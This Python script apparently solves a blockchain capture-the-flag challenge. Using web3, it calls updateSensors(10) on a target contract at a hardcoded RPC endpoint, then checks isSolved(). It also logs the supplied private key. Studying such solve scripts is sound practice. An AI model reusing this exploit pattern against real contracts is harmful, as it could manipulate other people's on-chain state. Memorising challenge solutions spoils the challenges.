from solcx import compile_files, install_solc_pragma
from web3 import Web3
from pwn import log, remote
install_solc_pragma('pragma solidity ^0.8.18;')
log.setLevel('debug')


rpc = "http://68.183.45.146:31938/"
private_key = input().strip()
setupContract = input().strip()
log.info(f"{private_key = }")
log.info(f"{setupContract = }")
# compile sol
compiled_sol = compile_files(
    ['Setup.sol', 'Unknown.sol'],
    output_values=['abi', 'bin'],
    solc_version="0.8.18"
)
SetupContract = compiled_sol['Setup.sol:Setup']
UnknownContract = compiled_sol['Unknown.sol:Unknown']

w3 = Web3(Web3.HTTPProvider(rpc))
account = w3.eth.account.from_key(private_key)
my_address = account.address
log.info(f"My address: {my_address}")
log.info(f"My balance: {w3.eth.get_balance(my_address)}")

# log.debug("All accounts in this current network: ")
# for _address in w3.eth.accounts:
#     log.info(f"Address: {_address}, balance: {w3.eth.get_balance(_address)}")


# remote contract
Setup = w3.eth.contract(address=setupContract, abi=SetupContract['abi'])
unknownAddress = Setup.functions.TARGET().call()
unknown = w3.eth.contract(address=unknownAddress, abi=UnknownContract['abi'])
tx_hash = unknown.functions.updateSensors(10).transact({
    "chainId": w3.eth.chain_id,
    "gasPrice": w3.eth.gas_price,
    "from": my_address,
    "nonce": w3.eth.getTransactionCount(my_address)
})
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

log.info(str(Setup.functions.isSolved().call()))
